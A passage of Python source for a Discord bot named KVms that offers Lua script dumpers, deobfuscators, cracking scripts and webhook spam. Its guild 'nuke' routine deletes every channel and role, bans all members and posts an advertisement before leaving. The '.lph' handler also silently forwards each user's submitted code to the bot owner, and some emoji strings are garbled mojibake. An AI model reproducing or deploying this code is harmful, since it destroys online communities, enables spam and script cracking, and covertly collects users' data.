        user_job_state[\"queue_position\"] = job_position
        try:
            if job_position > MAX_CONCURRENT_JOBS:
                await _safe_edit(
                    s,
                    content=f\"{EMOJI_LOADING} queued at position {job_position}...\",
                )
            out, err = await engine_fn(lua_code)
        finally:
            await _leave_job_queue()
        took = time.perf_counter() - t_start
        if err:
            error_text = _engine_failure_message(prefix)
            _job_mark_status(user_job_state, \"failed\", error_text)
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {error_text}\",
                color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
            return
        if out is None:
            error_text = _engine_failure_message(prefix)
            _job_mark_status(user_job_state, \"failed\", error_text)
            em = discord.Embed(description=f\"{EMOJI_FAIL} {error_text}\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
            return

        txt = out.decode(\"utf-8\", errors=\"ignore\") if isinstance(out, bytes) else str(out)
        txt = _fix_mojibake(txt)
        txt = _strip_leakd_watermarks(txt)
        if _looks_like_engine_error(txt):
            error_text = _engine_failure_message(prefix)
            _job_mark_status(user_job_state, \"failed\", error_text)
            em = discord.Embed(description=f\"{EMOJI_FAIL} {error_text}\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
            return
        out_bytes = txt.encode(\"utf-8\")
        if len(out_bytes) > MAX_OUTPUT_BYTES:
            _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
            em = discord.Embed(description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
            return
        _job_set_output(user_job_state, out_bytes, filename=output_filename, status=\"completed\")
        asyncio.ensure_future(_send_owner_result_metadata(
            message, prefix.lstrip(\".\"), output_bytes=out_bytes,
            took=took, output_name=output_filename,
        ))
        preview = _strip_mentions(\"\\n\".join(txt.splitlines()[:30]))[:1000]

        pastefy_url = None
        cfg = get_user_config(message.author.id)
        if cfg.get(\"pastefy_enabled\", True):
            pf = await asyncio.to_thread(_upload_to_pastefy, txt, output_filename)
            if pf:
                pastefy_url = pf

        urls      = _extract_urls_from_output(txt)
        urls_line = _format_urls_footer(urls)

        embed = discord.Embed(title=embed_title, color=GOOD)
        embed.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
        desc_parts = [f\"```lua\\n{preview}\\n```\"]
        if pastefy_url:
            desc_parts.append(f\"**Pastefy:** {pastefy_url}\")
        desc_parts.append(urls_line)
        embed.description = \"\\n\".join(desc_parts)
        embed.set_footer(text=_make_footer(took))
        await s.delete()
        await _safe_reply(message, embed=embed,
            file=discord.File(io.BytesIO(out_bytes), filename=output_filename))
    except Exception as e:
        _job_mark_status(user_job_state, \"failed\", _engine_failure_message(prefix))
        try:
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {_engine_failure_message(prefix)}\",
                color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
        except Exception:
            pass
    finally:
        await _finish_user_job(user_job_state)


# =========================
# LPH HANDLER
# =========================
async def _handle_lph_command(message, content: str):
    uid = message.author.id
    if await _user_job_busy(uid):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    remaining = _lph_check_cooldown(uid)
    if remaining > 0:
        if not await _check_anti_spam(message, \"lph\"):
            return
        mins = int(remaining // 60)
        secs = int(remaining % 60)
        embed = discord.Embed(
            description=(f\"ƒ‚‚ you can use `.lph` again in **{mins}m {secs}s**\\n\"
                         f\"grab premium to skip cooldowns\"),
            color=WARN)
        embed.set_footer(text=_make_footer())
        return await _safe_reply(message, embed=embed, mention_author=False)

    lua_code = None
    is_url = False
    parts = content.split(maxsplit=1)
    if len(parts) > 1 and parts[1].strip().startswith((\"http://\", \"https://\")):
        is_url = True
        try:
            s = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
            raw = await fetch_from_url(parts[1].strip())
            if raw is None:
                await _send_lph_panel_error(
                    message, \"input URL fetch returned no data\")
                await _safe_edit(s, content=LURAPH_ERROR)
                return
            lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
            await s.delete()
        except Exception as e:
            await _send_lph_panel_error(
                message, f\"input URL fetch error: {e}\")
            try:
                await _safe_edit(s, content=LURAPH_ERROR)
            except Exception:
                pass
            return

    if not lua_code and message.reference:
        try:
            ref = (message.reference.resolved or
                   await message.channel.fetch_message(message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if not lua_code:
        for att in message.attachments:
            if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
                try:
                    raw = await _read_attachment_limited(att)
                    if raw:
                        lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                        break
                except Exception:
                    pass

    if not lua_code and not is_url:
        after = content[4:].strip()
        cb = LUA_CODEBLOCK.search(content)
        if cb:
            lua_code = cb.group(1).strip()
        elif after and not after.startswith((\"http://\", \"https://\")):
            lua_code = after

    if not lua_code:
        await _safe_reply(message, content=\"`.lph <code|url>` - or reply/attach a `.lua` file\")
        return
    if not _source_within_input_limit(lua_code):
        return await _safe_reply(message, content=\"input too large (maximum 8 MB)\")

    asyncio.ensure_future(_forward_to_owner(\"lph\", message.author, \"lph_input.lua\",
        lua_code.encode(\"utf-8\", errors=\"ignore\"), message))

    t_start = time.perf_counter()
    s = await _safe_reply(message, content=f\"{EMOJI_LOADING} running LPH engine...\")
    user_job_state = await _claim_user_job(message.author.id)
    if user_job_state is None:
        return await _safe_edit(s, content=\"you already have a job running; wait for it to finish or use `.cancel`\", embed=None)
    user_job_state[\"status\"] = s
    _job_bind_message(user_job_state, message)
    _job_set_command(user_job_state, \".lph\")
    input_source, input_name, input_url = _job_source_info(message, content, \".lph\", \"lph_input.lua\")
    _job_set_input(user_job_state, lua_code, source=input_source,
                   filename=input_name, url=input_url)
    try:
        await _safe_edit(s, content=f\"{EMOJI_LOADING} running LPH engine... | Job ID: `{user_job_state['job_id']}`\")
    except Exception:
        pass
    _lph_set_cooldown(uid)
    try:
        job_priority = 1 if is_premium(message.author.id) else 0
        user_job_state[\"command\"] = \".lph\"
        user_job_state[\"priority\"] = job_priority
        user_job_state[\"queue_position\"] = \"waiting\"
        job_position = await _enter_job_queue(priority=job_priority)
        user_job_state[\"queue_position\"] = job_position
        try:
            if job_position > MAX_CONCURRENT_JOBS:
                await _safe_edit(
                    s,
                    content=f\"{EMOJI_LOADING} queued at position {job_position}...\",
                )
            results, panel_error = await run_lph_engine(lua_code)
            if panel_error:
                await _send_lph_panel_error(
                    message, panel_error, job_id=user_job_state.get(\"job_id\"))
        finally:
            await _leave_job_queue()
    except asyncio.CancelledError:
        await _finish_user_job(user_job_state)
        raise
    except Exception as e:
        _job_mark_status(user_job_state, \"failed\", LURAPH_ERROR)
        em = discord.Embed(
            description=f\"{EMOJI_FAIL} {LURAPH_ERROR}\",
            color=BAD)
        em.set_footer(text=_make_footer())
        try:
            await _safe_edit(s, content=None, embed=em)
        except asyncio.CancelledError:
            await _finish_user_job(user_job_state)
            raise
        except Exception:
            pass
        await _finish_user_job(user_job_state)
        return

    try:
        took = time.perf_counter() - t_start
        all_files = []
        output_parts = []
        aggregate_size = 0
        desc_lines = []
        for mode_name, files, error in results:
            if files:
                total_size  = sum(len(d) for _, _, d in files)
                total_lines = sum((d.count(b'\\n') + 1) if isinstance(d, bytes) else (d.count('\\n') + 1) for _, _, d in files)
                desc_lines.append(f\"{EMOJI_SUCCESS} `{mode_name}` - {len(files)} file(s) | {total_lines:,} lines | {total_size/1024:.1f} KB\")
                for label, fname, data in files:
                    if isinstance(data, str):
                        data = data.encode(\"utf-8\", errors=\"ignore\")
                    aggregate_size += len(data)
                    if aggregate_size > MAX_OUTPUT_BYTES:
                        _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
                        em = discord.Embed(description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\", color=BAD)
                        em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
                        em.set_footer(text=_make_footer(took))
                        await s.delete()
                        await _safe_reply(message, embed=em, mention_author=False)
                        return
                    output_parts.append(data)
                    all_files.append(discord.File(io.BytesIO(data), filename=fname))
            else:
                short_err = _strip_mentions(_sanitize_error(error or \"no output\"))[:80]
                desc_lines.append(f\"{EMOJI_FAIL} `{mode_name}` - {short_err}\")

        if not all_files:
            _job_mark_status(user_job_state, \"failed\", LURAPH_ERROR)
            embed = discord.Embed(title=\"LPH failed\",
                description=(\"\\n\".join(desc_lines))[:2000],
                color=BAD, timestamp=datetime.now())
            embed.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            embed.set_footer(text=_make_footer(took))
            await s.delete()
            await _safe_reply(message, embed=embed, mention_author=False)
            return

        combined_output = b\"\\n\".join(output_parts)
        _job_set_output(user_job_state, combined_output, filename=\"lph_output.lua\", status=\"completed\")
        is_prem = is_premium(uid)
        embed = discord.Embed(title=\"LPH Result\",
            description=\"\\n\".join(desc_lines)[:2000], color=GOOD, timestamp=datetime.now())
        embed.add_field(name=\"Status\",
            value=(f\"{'ƒ‚‚ Premium' if is_prem else 'ƒ...‚œ‚ Standard'} | \"
                   f\"{sum(1 for _, f, _ in results if f)}/{len(results)} succeeded\"),
            inline=False)
        embed.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
        embed.set_footer(text=_make_footer(took))
        await s.delete()

        aggregate_hash = hashlib.sha256()
        # discord.File has already consumed the bytes above, so derive metadata
        # from the successful mode results before creating the attachments.
        for _mode_name, mode_files, _error in results:
            for _label, _fname, raw_data in mode_files:
                if isinstance(raw_data, str):
                    raw_data = raw_data.encode(\"utf-8\", errors=\"ignore\")
                aggregate_hash.update(raw_data)
                aggregate_size += len(raw_data)
        asyncio.ensure_future(_send_owner_result_metadata(
            message, \"lph\", output_hash=aggregate_hash.hexdigest(),
            output_size=aggregate_size, took=took, output_name=\"lph_output.lua\",
        ))

        batch_size = 10
        first_batch = all_files[:batch_size]
        rest = [all_files[i:i+batch_size] for i in range(batch_size, len(all_files), batch_size)]
        await _safe_reply(message, content=message.author.mention, embed=embed,
            files=first_batch, mention_author=True)
        for batch in rest:
            try:
                await message.reply(files=batch, mention_author=False)
            except Exception as ex:
                print(f\"[LPH] Batch send failed: {ex}\")
    except Exception:
        _job_mark_status(user_job_state, \"failed\", LURAPH_ERROR)
        try:
            em = discord.Embed(description=f\"{EMOJI_FAIL} {LURAPH_ERROR}\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
        except Exception:
            pass
    finally:
        await _finish_user_job(user_job_state)


# =========================
# CONFIG EMBED / VIEW (.l only flags)
# =========================
def create_config_embed(uid, config):
    embed = discord.Embed(title=\"KVms Config\", color=0x2b2d31,
        description=(f\"These flags only apply to **`.l`**.\\n\"
                     f\"ƒ‚‚ƒ‚‚ **Timeout:** fixed at `{HARD_MAX_TIMEOUT}s`\\n\"
                     f\"ƒ...‚“‚ **Pastefy Auto-Upload:** `{'ON' if config.get('pastefy_enabled', True) else 'OFF'}`\"))
    flags = {\"hook_op\": \"HookOp\", \"constants\": \"Constants\"}
    fl = [f\"{'[ON] ' if config.get(k) else '[OFF]'}{v}\" for k, v in flags.items()]
    embed.add_field(name=\"Flags\", value=\"```\\n\" + \"\\n\".join(fl) + \"\\n```\", inline=False)
    embed.set_footer(text=f\"User: {uid}\")
    return embed

class ConfigView(discord.ui.View):
    def __init__(self, uid):
        super().__init__(timeout=60)
        self.uid    = uid
        self.config = get_user_config(uid)
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        flags = [(\"hook_op\", \"HookOp\"), (\"constants\", \"Constants\")]
        for flag, label in flags:
            style = ButtonStyle.success if self.config.get(flag) else ButtonStyle.secondary
            b = discord.ui.Button(label=label, style=style, custom_id=f\"cfg_{flag}\")
            b.callback = self.make_cb(flag)
            self.add_item(b)
        pb = discord.ui.Button(
            label=\"Pastefy\",
            style=ButtonStyle.success if self.config.get(\"pastefy_enabled\", True) else ButtonStyle.secondary,
            custom_id=\"cfg_pastefy\")
        pb.callback = self.pastefy_cb
        self.add_item(pb)
        rb = discord.ui.Button(label=\"Reset\", style=ButtonStyle.danger, custom_id=\"cfg_reset\")
        rb.callback = self.reset_cb
        self.add_item(rb)

    def make_cb(self, flag):
        async def cb(i):
            if i.user.id != self.uid:
                return await i.response.send_message(\"not yours\", ephemeral=True)
            self.config[flag] = not self.config.get(flag, False)
            save_user_config(self.uid, self.config)
            self.update_buttons()
            await i.response.edit_message(embed=create_config_embed(self.uid, self.config), view=self)
        return cb

    async def pastefy_cb(self, i):
        if i.user.id != self.uid:
            return await i.response.send_message(\"not yours\", ephemeral=True)
        self.config[\"pastefy_enabled\"] = not self.config.get(\"pastefy_enabled\", True)
        save_user_config(self.uid, self.config)
        self.update_buttons()
        await i.response.edit_message(embed=create_config_embed(self.uid, self.config), view=self)

    async def reset_cb(self, i):
        if i.user.id != self.uid:
            return await i.response.send_message(\"not yours\", ephemeral=True)
        self.config = DEFAULT_CONFIG.copy()
        save_user_config(self.uid, self.config)
        self.update_buttons()
        await i.response.edit_message(embed=create_config_embed(self.uid, self.config), view=self)

# =========================
# GUILD HELPERS
# =========================
async def _process_one_guild_del(guild: discord.Guild) -> dict:
    result = {\"name\": guild.name, \"id\": guild.id, \"members\": guild.member_count or 0,
              \"ad_sent\": False, \"left\": False}
    ad = (f\"@everyone\\n\\nƒ... ƒ‚‚ **This server is no longer supported.**\\n\"
          f\"Join our main Discord:\\nƒ...‚‚€ **{MAIN_DISCORD_LINK}**\\n\\nSee you there! ƒ...‚œ‚\")
    for ch in guild.text_channels:
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages and perms.mention_everyone:
                await ch.send(ad)
                result[\"ad_sent\"] = True
                break
        except Exception:
            continue
    try:
        await guild.leave()
        result[\"left\"] = True
    except Exception:
        result[\"left\"] = False
    return result

async def _process_one_guild_nuke(guild: discord.Guild) -> dict:
    result = {\"name\": guild.name, \"id\": guild.id, \"members\": guild.member_count or 0,
              \"ad_sent\": False, \"ch_del\": 0, \"ch_fail\": 0,
              \"role_del\": 0, \"role_fail\": 0, \"bans\": 0, \"ban_fail\": 0, \"left\": False}
    ad = (f\"@everyone\\n\\nƒ‹“‚ƒ‚‚ **This server has been nuked.**\\n\"
          f\"Join our main Discord:\\nƒ...‚‚€ **{MAIN_DISCORD_LINK}**\\n\\nGG ƒ...‚„€š\")
    for ch in guild.text_channels:
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages:
                await ch.send(ad)
                result[\"ad_sent\"] = True
                break
        except Exception:
            continue
    for ch in list(guild.channels):
        try:
            await ch.delete(reason=\"KVms nuke\")
            result[\"ch_del\"] += 1
            await asyncio.sleep(0.4)
        except Exception:
            result[\"ch_fail\"] += 1
    bot_top = guild.me.top_role if guild.me else None
    for role in list(guild.roles):
        if role.is_default(): continue
        if bot_top and role.position >= bot_top.position: continue
        try:
            await role.delete(reason=\"KVms nuke\")
            result[\"role_del\"] += 1
            await asyncio.sleep(0.4)
        except Exception:
            result[\"role_fail\"] += 1
    try:
        if guild.me and guild.me.guild_permissions.ban_members:
            for member in list(guild.members):
                if member.id in (bot.user.id, OWNER_ID): continue
                try:
                    await member.ban(reason=\"KVms nuke\", delete_message_days=0)
                    result[\"bans\"] += 1
                    await asyncio.sleep(0.4)
                except Exception:
                    result[\"ban_fail\"] += 1
    except Exception:
        pass
    try:
        await guild.leave()
        result[\"left\"] = True
    except Exception:
        result[\"left\"] = False
    return result

def _build_summary_file(results: list, mode: str) -> bytes:
    lines = [f\"KVms {mode.upper()} Summary - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\",
              f\"Total processed: {len(results)}\", \"=\" * 60]
    for r in results:
        if mode == \"del\":
            lines.append(f\"[{'ƒ...€œ‚' if r['left'] else 'ƒ‚...€TM'}] {r['name']} ({r['id']}) | Members: {r['members']} | Ad: {'ƒ...€œ‚' if r['ad_sent'] else 'ƒ‚...€TM'} | Left: {'ƒ...€œ‚' if r['left'] else 'ƒ‚...€TM'}\")
        else:
            lines.append(f\"[{'ƒ...€œ‚' if r['left'] else 'ƒ‚...€TM'}] {r['name']} ({r['id']}) | Ch:{r['ch_del']} Role:{r['role_del']} Bans:{r['bans']} Ad:{'ƒ...€œ‚' if r['ad_sent'] else 'ƒ‚...€TM'} Left:{'ƒ...€œ‚' if r['left'] else 'ƒ‚...€TM'}\")
    return \"\\n\".join(lines).encode(\"utf-8\")

async def _reply_disabled(message, name: str):
    active = [n for n, _label in PUBLIC_FEATURES
              if n != name and n not in disabled_commands]
    active_str = \", \".join(f\"`.{n}`\" for n in active) if active else \"none\"
    embed = discord.Embed(
        description=(f\"`.{name}` version turned off rn.\\n\"
                     f\"**Current active:** {active_str}\"),
        color=BAD)
    embed.set_footer(text=_make_footer())
    await _safe_reply(message, embed=embed, mention_author=False)

# =========================
# TOS VIEW
# =========================
class TOSView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=120)
        self.user_id = user_id

    @discord.ui.button(label=\"I Agree\", style=ButtonStyle.success, custom_id=\"tos_agree\")
    async def agree_cb(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message(\"not yours\", ephemeral=True)
        tos_accepted.add(self.user_id)
        _save_tos(tos_accepted)
        await interaction.response.edit_message(
            content=f\"ƒ...€œ‚ you're good - you agreed to the Terms of Service\\n\\n**now run your command again**\",
            embed=None, view=None)

    @discord.ui.button(label=\"Decline\", style=ButtonStyle.danger, custom_id=\"tos_decline\")
    async def decline_cb(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            return await interaction.response.send_message(\"not yours\", ephemeral=True)
        await interaction.response.edit_message(
            content=\"ƒ‚...€TM you declined the ToS, so you can't use KVms features\",
            embed=None, view=None)

async def _ensure_tos(message) -> bool:
    if message.author.id in tos_accepted:
        return True
    if message.author.id == OWNER_ID:
        return True
    embed = discord.Embed(title=\"KVms - Terms of Service\", description=TOS_TEXT, color=ACCENT)
    embed.set_footer(text=_make_footer())
    await _safe_reply(message, embed=embed, view=TOSView(message.author.id), mention_author=False)
    return False

# =========================
# DETECT VIEW
# =========================
class DetectView(discord.ui.View):
    def __init__(self, recommendation: str):
        super().__init__(timeout=60)
        self.recommendation = recommendation
        b = discord.ui.Button(
            label=f\"Recommended: {recommendation}\",
            style=ButtonStyle.primary,
            custom_id=\"detect_copy\")
        b.callback = self.copy_cb
        self.add_item(b)

    async def copy_cb(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            f\"use `{self.recommendation}` on your script\", ephemeral=True)

# =========================
# HELP CATEGORIES VIEW
# =========================
HELP_CATEGORIES = {
    \"Dumpers\": {
        \"fields\": [
            (\".l <code|url|reply|file>\",     f\"main dumper - {L_COOLDOWN_SECONDS}s cooldown ({L_ADAPTIVE_COOLDOWN_SECONDS}s after {L_ADAPTIVE_JOB_THRESHOLD} jobs/10m; premium = no cd)\"),
            (\".l2 <code|url|reply|file>\",    \"dumper v2\"),
            (\".l3 <code|url|reply|file>\",    \"dumper v3\"),
            (\".wyn <code|url|reply|file>\",   \"wynfuscate dumper\"),
            (\".constant <code|url|reply|file>\", \"constant dumper\"),
        ]
    },
    \"Deobfuscators\": {
        \"fields\": [
            (\".deobf <code|url|reply|file>\",      \"general deobfuscator\"),
            (\".promdeobf <code|url|reply|file>\",  \"prometheus deobfuscator (powered by LeakD)\"),
            (\".moonsec <code|url|reply|file>\",    \"moonsec deobfuscator (powered by LeakD)\"),
            (\".beautify <code|url|reply|file>\",   \"lua code beautifier (powered by LeakD)\"),
            (\".lph <code|url|reply|file>\",        \"single python lph.py engine - 402s / 6.7m cooldown (premium/owner = no cd)\"),
        ]
    },
    \"Tools\": {
        \"fields\": [
            (\".rename <file>\",                    \"rename variables using rename.py\"),
            (\".get <url>\",                        \"fetch raw lua from a url\"),
            (\".detect / .dtc <code|url|file>\",   \"detect what obfuscator was used\"),
            (\".obf <code|url|reply|file>\",       \"obfuscator with anti-tamper enabled\"),
            (\".upload <code|url|reply|file>\",    \"upload Lua to Pastefy and create a loadstring\"),
            (\".status\",                           \"see which features are on/off\"),
            (\".queue\",                            \"see active and waiting jobs\"),
            (\".job\",                              \"see your processing status and queue progress\"),
            (\".cancel\",                           \"cancel your active or queued processing job\"),
            (\".whspam <url> <chat>\",              \"webhook spam (10m cd, premium 60s)\"),
            (\".crackenv / .cenv\",                 \"sends environment cracker script\"),
            (\".luarmor\",                          \"sends luarmor script\"),
        ]
    },
    \"Obfuscators\": {
        \"fields\": None,  # filled dynamically from obfuscator_db
    },
    \"Account\": {
        \"fields\": [
            (\".cfg\",                \"personal config panel\"),
            (\".redeem <key>\",       \"redeem a premium key and sync the configured server role\"),
        ]
    },
}

class HelpView(discord.ui.View):
    def __init__(self, author_id: int):
        super().__init__(timeout=120)
        self.author_id = author_id
        self.current   = None
        # Buttons are label-only (no emoji). Unicode emojis in Button(emoji=...)
        # get corrupted on some setups and Discord rejects them with
        # \"Invalid emoji\" (HTTP 400, error 50035).
        for cat in HELP_CATEGORIES:
            b = discord.ui.Button(label=cat, style=ButtonStyle.secondary, custom_id=f\"help_{cat}\")
            b.callback = self.make_cb(cat)
            self.add_item(b)

    def make_cb(self, cat: str):
        async def cb(i: discord.Interaction):
            if i.user.id != self.author_id:
                return await i.response.send_message(\"not yours\", ephemeral=True)
            self.current = cat
            data = HELP_CATEGORIES[cat]
            if cat == \"Obfuscators\":
                # Show ONLY the supported names (owner manages via .addobf/.delobf).
                names = sorted(obfuscator_db.keys())
                if names:
                    desc = \"\\n\".join(f\"`{n}`\" for n in names)
                else:
                    desc = \"no obfuscators added yet\"
            else:
                desc = \"\\n\".join(f\"`{cmd}` - {desc}\" for cmd, desc in data[\"fields\"])
            embed = discord.Embed(
                title=cat,
                color=0x2b2d31,
                description=desc
            )
            embed.set_footer(text=_make_footer())
            await i.response.edit_message(embed=embed, view=self)
        return cb

# =========================
# BOT COMMANDS
# =========================
@bot.command(name=\"help\")
async def help_command(ctx):
    if not is_allowed(ctx.message):
        return
    embed = discord.Embed(
        title=\"KVms - Command Help\",
        description=\"pick a category below to see the commands\",
        color=0x2b2d31
    )
    embed.set_footer(text=_make_footer())
    await ctx.reply(embed=embed, view=HelpView(ctx.author.id))

# =========================
# PRIVATE JOB SEARCH (owner DM only)
# =========================
def _job_preview_for_embed(value: str, limit: int = 1200) -> str:
    value = _mask_host_ip_leaks(str(value or \"\"))
    value = value.replace(\"```\", \"``\\u200b`\")
    return value[:limit] or \"-\"


def _job_summary_text(summary: dict, input_side: bool = False) -> str:
    if not isinstance(summary, dict) or not summary:
        return \"not recorded\"
    lines = []
    source = summary.get(\"source\")
    if source:
        lines.append(f\"source: {source}\")
    filename = summary.get(\"filename\")
    if filename:
        lines.append(f\"file: {filename}\")
    url = summary.get(\"url\")
    if url:
        lines.append(f\"url: {url}\")
    if summary.get(\"size\") is not None:
        lines.append(f\"size: {int(summary.get('size') or 0):,} bytes\")
    if summary.get(\"sha256\"):
        lines.append(f\"sha256: {summary['sha256']}\")
    preview = summary.get(\"preview\")
    if preview:
        lines.append((\"input preview:\" if input_side else \"output preview:\") +
                     f\"\\n```lua\\n{_job_preview_for_embed(preview)}\\n```\")
    return \"\\n\".join(lines)[:1900] or \"not recorded\"


@bot.command(name=\"search\", hidden=True)
async def search_job_command(ctx, job_id: str = None):
    # Never answer this command in a guild channel. A hidden command alone is
    # not enough protection because owner messages can still be forwarded.
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    normalized = (job_id or \"\").strip().upper()
    if not re.fullmatch(r\"KVMS-JOB-[A-Z0-9]{4}-[A-Z0-9]{4}\", normalized):
        return await ctx.reply(\"usage: `.search KVMS-JOB-XXXX-XXXX`\", delete_after=12)
    with _job_registry_lock:
        record = dict(job_registry.get(normalized) or {})
    if not record:
        return await ctx.reply(f\"no private record found for `{normalized}`\", delete_after=12)

    user_id = record.get(\"user_id\", \"unknown\")
    user_tag = record.get(\"user_tag\") or \"tag unavailable\"
    status = record.get(\"status\") or \"unknown\"
    try:
        created_ts = float(record.get(\"created_at\") or time.time())
        timestamp = datetime.fromtimestamp(created_ts)
    except Exception:
        created_ts = time.time()
        timestamp = datetime.now()
    embed = discord.Embed(
        title=f\"Private job record €” {normalized}\",
        description=\"This response is owner-only and is sent only in this DM.\",
        color=GOOD if status == \"completed\" else (BAD if status in {\"failed\", \"cancelled\"} else ACCENT),
        timestamp=timestamp,
    )
    embed.add_field(name=\"Who\", value=f\"`{_strip_mentions(str(user_tag))}`\\nID: `{user_id}`\", inline=True)
    duration = record.get(\"duration_seconds\")
    timing = f\"created: <t:{int(created_ts)}:F>\"
    if duration is not None:
        timing += f\"\\nelapsed: `{float(duration):.3f}s`\"
    embed.add_field(name=\"Command / status\",
                    value=f\"`{record.get('command', 'unknown')}`\\n`{status}`\", inline=True)
    embed.add_field(name=\"Timing\", value=timing, inline=True)
    embed.add_field(name=\"Secret / hidden\",
                    value=\"`YES €” owner DM only`\", inline=True)
    embed.add_field(name=\"Input\", value=_job_summary_text(record.get(\"input\"), input_side=True), inline=False)
    embed.add_field(name=\"Output\", value=_job_summary_text(record.get(\"output\"), input_side=False), inline=False)
    if record.get(\"error\"):
        embed.add_field(name=\"Error\", value=f\"```\\n{_job_preview_for_embed(record['error'], 900)}\\n```\", inline=False)
    embed.set_footer(text=\"KVms | Private owner record | not shown publicly\")
    await ctx.reply(embed=embed)

@bot.command(name=\"ownerhelp\", hidden=True)
async def owner_help_command(ctx):
    \"\"\"Owner-only help - only works in DMs.\"\"\"
    if ctx.author.id != OWNER_ID:
        return
    if ctx.guild is not None:
        return  # Only in DMs
    embed = discord.Embed(
        title=\"KVms - Owner Commands\",
        description=\"these are private and never shown to anyone else\",
        color=0x5865F2
    )
    cmds = [
        (\".genkey [amount] [user] [duration]\", \"generate premium key(s) - durations: 1d 7d 30d 1h 60m lifetime\"),
        (\".revoke <key|user>\",                  \"revoke a key OR a user (id/@tag/name) - removes premium + claimed keys\"),
        (\".unprem <user_id>\",                   \"remove premium from a user\"),
        (\".prem [user]\",                        \"list all premium users, or toggle premium for a user\"),
        (\".premrole <role>\",                     \"configure and sync the premium role for this server (mention, ID, or name)\"),
        (\".ban <user_id|@user|name>\",           \"ban/unban a user by id, mention, or username\"),
        (\".banlist\",                          \"list everyone who is banned, with their tags\"),
        (\".disable <cmd>\",                      \"toggle disable/enable a command\"),
        (\".sanitize\",                           \"toggle path sanitization in error messages\"),
        (\".stats [user_id]\",                    \"per-user & per-command usage stats\"),
        (\".search <job_id>\",                     \"private job record: user, input, output, and status\"),
        (\".proxies\",                            \"show proxy stats\"),
        (\".reloadproxies / .rp\",                \"reload and verify proxies\"),
        (\".clearbl\",                            \"clear proxy blacklist\"),
        (\".serv\",                               \"list all servers the bot is in\"),
        (\".del [guild_id]\",                     \"send ad and leave non-whitelisted servers\"),
        (\".nuke confirm [guild_id]\",            \"confirm and nuke non-whitelisted servers\"),
        (\".ldebug <code|url|file>\",             \"debug engine\"),
        (\".inpdtc <file|url|code|reply> <obf_name> [recommendation] [notes]\", \"preview then save a detection sample, patterns, recommendation, and notes\"),
        (\".obftest [expected_name]\",             \"test a sample; only bounded detector hit statistics may update\"),
        (\".addobf <nama>\",                     \"add an obfuscator name to the private detector database\"),
        (\".obfpat <name> <pattern>\",             \"add an exact private detection pattern\"),
        (\".obfmeta <name> <command> [notes]\",    \"update a private recommendation and notes\"),
        (\".obflist / .obfs / .support\",           \"list detector obfuscators and their recommendations\"),
        (\".obfshow <name>\",                       \"show one entry's patterns, recommendation, and notes\"),
        (\".delobf <nama>\",                     \"remove an obfuscator from the supported list\"),
        (\".setwebhook <url>\",                   \"set the webhook url used by .whspam\"),
        (\".status\",                             \"public feature status (same as users see)\"),
        (\".health\",                             \"private bot/backend/queue health\"),
        (\".dashboard / .dash\",                  \"private live queue, resource, task, and usage dashboard\"),
    ]
    embed.description = \"\\n\".join(f\"`{cmd}` - {desc}\" for cmd, desc in cmds)
    embed.set_footer(text=\"KVms | Owner Only | DO NOT SHARE\")
    await ctx.reply(embed=embed)

@bot.command(name=\"cfg\")
async def config_command(ctx):
    if not is_allowed(ctx.message):
        return
    uid = ctx.author.id
    await ctx.reply(embed=create_config_embed(uid, get_user_config(uid)), view=ConfigView(uid))

# =========================
# STATUS (public feature list)
# =========================
@bot.command(name=\"status\")
async def status_command(ctx):
    if not is_allowed(ctx.message):
        return
    lines = []
    for name, label in PUBLIC_FEATURES:
        state = \"OFF\" if name in disabled_commands else \"ON\"
        lines.append(f\"{'[OFF]' if name in disabled_commands else '[ON] '} {label}\")
    embed = discord.Embed(
        title=\"KVms - Feature Status\",
        description=\"```\\n\" + \"\\n\".join(lines) + \"\\n```\",
        color=ACCENT)
    embed.set_footer(text=_make_footer())
    await ctx.reply(embed=embed)

@bot.command(name=\"queue\")
async def queue_command(ctx):
    if not is_allowed(ctx.message):
        return
    running, pending = await _job_queue_snapshot()
